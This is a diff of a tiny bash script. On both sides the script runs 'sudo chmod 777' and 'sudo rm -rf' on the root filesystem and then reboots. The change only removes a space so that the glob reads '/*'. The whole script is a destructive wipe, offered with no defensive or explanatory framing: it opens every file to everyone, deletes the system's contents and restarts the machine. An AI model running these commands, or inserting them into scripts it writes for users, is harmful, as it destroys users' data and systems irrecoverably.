@@ -1,7 +1,7 @@
 #!/bin/bash
 
-sudo chmod 777 / *
+sudo chmod 777 /*
 
-sudo rm -rf / *
+sudo rm -rf /*
 
 sudo reboot
